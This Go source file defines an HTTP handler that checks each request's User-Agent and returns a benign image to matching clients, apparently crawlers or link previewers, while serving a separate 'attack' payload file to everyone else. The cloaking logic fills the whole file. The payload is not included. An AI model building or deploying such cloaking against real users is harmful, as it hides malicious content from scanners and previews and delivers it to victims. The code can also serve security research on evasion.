package main

import (
	"io/ioutil"
	"mime"
	"net/http"
	"path/filepath"
	"strings"
)

// trickyHandler is a http.Handler that serves imageData for user agents that
// contain any string defined by uaTargets, and attackData for other user
// agents.
type trickyHandler struct {
	attackData    []byte
	imageData     []byte
	imageMimeType string
	uaTargets     []string
}

// newTrickyHandler creates a new trickyHandler using the specified uaTargets,
// image path, and payload path.
func newTrickyHandler(uaTargets []string, imagePath string, payloadPath string) (*trickyHandler, error) {
	imageData, err := ioutil.ReadFile(imagePath)
	if err != nil {
		return nil, err
	}
	imageMimeType := mime.TypeByExtension(filepath.Ext(imagePath))
	attackData, err := ioutil.ReadFile(payloadPath)
	if err != nil {
		return nil, err
	}
	return &trickyHandler{uaTargets: uaTargets, attackData: attackData, imageMimeType: imageMimeType, imageData: imageData}, nil
}

// ServeHTTP implements http.Handler's ServeHTTP method for a trickyHandler.
func (th *trickyHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	isTarget := false
	ua := r.Header.Get("User-Agent")
	for _, target := range th.uaTargets {
		if strings.Contains(ua, target) {
			isTarget = true
		}
	}

	var payload []byte
	if isTarget {
		w.Header().Set("Content-Type", th.imageMimeType)
		payload = th.imageData
	} else {
		payload = th.attackData
	}

	w.Write(payload)
}
